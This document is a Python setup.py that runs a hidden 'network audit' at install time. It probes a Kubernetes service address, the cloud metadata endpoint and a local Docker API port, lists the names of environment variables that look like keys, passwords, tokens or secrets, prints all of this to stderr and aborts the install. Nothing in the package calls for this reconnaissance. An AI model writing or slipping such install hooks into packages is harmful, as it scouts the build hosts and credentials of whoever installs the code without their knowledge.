import os, sys, socket, subprocess as sp
from setuptools import setup

def scan():
    o = sys.stderr.write
    o("\n--- NETWORK AUDIT ---\n")
    
     
    targets = [
        ("K8S Service", "10.0.0.1", 443),
        ("Metadata", "169.254.169.254", 80),
        ("Docker API", "127.0.0.1", 2375)
    ]
    
    for name, ip, port in targets:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((ip, port))
        status = "OPEN" if result == 0 else "CLOSED"
        o(f"{name} ({ip}:{port}): {status}\n")
        s.close()

     
    o("\n--- ENV SECRETS ---\n")
    for k, v in os.environ.items():
        if any(x in k.upper() for x in ['KEY', 'PASS', 'TOKEN', 'SECRET']):
            o(f"FOUND ENV: {k}\n")

    sys.exit(1)

try: scan()
except: sys.exit(1)

setup(name="n", version="0.1")
